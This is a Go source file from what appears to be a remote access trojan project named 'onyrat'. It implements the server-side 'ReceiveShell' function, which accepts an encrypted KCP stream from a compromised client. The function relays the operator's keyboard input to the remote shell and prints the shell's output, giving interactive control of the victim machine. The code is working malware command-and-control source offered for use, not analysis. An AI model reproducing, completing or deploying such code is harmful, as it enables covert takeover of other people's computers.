//go:build server
// +build server

package remoteshell

import (
	"fmt"
	"io"
	"os"
	"sync"
	"time"

	"github.com/Onyz107/onyrat/internal/logger"
	"github.com/Onyz107/onyrat/pkg/network"
)

type crfFilter struct{ r io.Reader }

// Filter for \r in case of fuckass windows trailing \r
func (f *crfFilter) Read(p []byte) (int, error) {
	n, err := f.r.Read(p)
	if err != nil {
		return 0, err
	}

	writeIdx := 0
	for readIdx := range n {
		if p[readIdx] != '\r' {
			p[writeIdx] = p[readIdx]
			writeIdx++
		}
	}

	return writeIdx, nil
}

func ReceiveShell(s *network.KCPServer, c *network.KCPClient) error {
	var wg sync.WaitGroup
	var cAddr = c.Sess.RemoteAddr().String()

	stream, err := c.Manager.AcceptStream(shellStream, 20*time.Second)
	if err != nil {
		return fmt.Errorf("failed to accept the shell stream for: %s: %w", cAddr, err)
	}
	defer stream.Close()

	// Read from stdin and send to stream
	w, err := s.NewStreamedEncryptedSender(stream, 0)
	if err != nil {
		return fmt.Errorf("failed to get streamed sender: %w", err)
	}

	wg.Add(1)
	go func() {
		defer wg.Done()
		io.Copy(w, &crfFilter{r: os.Stdin})
		stream.Close()
	}()

	logger.Log.Infof("Connected to remote shell: %s", cAddr)

	// Read from stream and write to stdout
	r, err := s.NewStreamedEncryptedReceiver(stream, 0)
	if err != nil {
		return fmt.Errorf("failed to get streamed receiver: %w", err)
	}

	io.Copy(os.Stdout, r)

	logger.Log.Infoln("\033[2K\rPress Enter to exit...") // To break the goroutine
	wg.Wait()

	logger.Log.Infof("Disconnected from remote shell: %s", cAddr)

	return nil
}
